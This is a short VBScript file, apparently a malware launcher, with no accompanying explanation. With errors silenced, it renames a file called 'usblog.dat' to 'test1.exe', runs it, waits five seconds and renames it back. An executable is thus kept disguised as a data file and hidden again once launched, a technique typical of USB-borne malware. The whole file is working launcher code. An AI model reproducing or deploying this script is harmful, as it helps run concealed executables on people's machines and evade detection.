on error resume next
Set rsh=WScript.CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")
FSO.MoveFile "usblog.dat", "test1.exe"
rsh.run("test1.exe")
WScript.sleep 5000
FSO.MoveFile "test1.exe","usblog.dat"
